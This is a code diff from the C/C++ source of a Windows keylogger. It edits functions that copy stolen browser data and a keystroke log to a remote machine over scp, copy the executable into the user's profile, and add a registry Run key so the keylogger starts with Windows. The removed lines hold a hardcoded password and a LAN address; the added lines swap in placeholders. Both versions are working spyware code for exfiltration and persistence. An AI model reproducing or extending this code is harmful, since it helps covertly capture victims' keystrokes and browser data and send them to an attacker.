@@ -324,8 +324,8 @@ void saveBrowserData() {
 }
 
 void transferFiles() {
-    system("echo '2001' | scp -P 22 -r browser_data ssh@192.168.0.127:C:/");
-    system("echo '2001' | scp -P 22 keylogs.log ssh@192.168.0.127:C:/");
+    system("scp -P 22 -r browser_data user@192.168.0.1:C:/path/to/folder");
+    system("scp -P 22 keylogs.log user@192.168.0.1:C:/path/to/folder");
 }
 
 void copyAndRenameFile() {
@@ -334,7 +334,7 @@ void copyAndRenameFile() {
     
     TCHAR szNewPath[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, szNewPath))) {
-        _tcscat_s(szNewPath, _T("\\Default\\AppData\\keylogger9.exe"));
+        _tcscat_s(szNewPath, _T("\\Default\\AppData\\keylogger.exe"));
         CopyFile(szPath, szNewPath, FALSE);  // Copies the file to the new location with the new name
     }
 }
@@ -343,9 +343,9 @@ void runOnStartup() {
     HKEY hKey;
     TCHAR szPath[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath))) {
-        _tcscat_s(szPath, _T("\\Temp\\keylogger9.exe"));
+        _tcscat_s(szPath, _T("\\Temp\\keylogger.exe"));
         RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
-        RegSetValueEx(hKey, _T("keylogger9"), 0, REG_SZ, (BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));  // Sets the registry key to run the program on startup
+        RegSetValueEx(hKey, _T("keylogger"), 0, REG_SZ, (BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));  // Sets the registry key to run the program on startup
         RegCloseKey(hKey);
     }
 }
